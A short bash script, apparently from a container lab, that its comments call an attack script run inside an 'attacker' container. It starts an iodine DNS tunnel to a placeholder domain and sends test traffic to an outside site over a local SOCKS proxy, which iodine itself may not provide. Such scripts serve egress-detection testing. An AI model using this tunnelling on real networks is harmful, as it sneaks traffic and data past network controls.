#!/bin/bash
# 在 attacker 容器内执行

echo "[*] 启动 iodine 客户端，尝试建立 DNS 隧道..."
# 假设域名是 tunnel.example.com，密码是 "secret"
iodine -f -P secret 10.0.1.3 tunnel.example.com &

# 等待隧道建立
sleep 5

echo "[*] 通过隧道传输测试数据..."
# 尝试通过隧道访问一个外部服务
curl --socks5 127.0.0.1:1080 http://ip.sb

echo "[+] 攻击脚本执行完毕。"
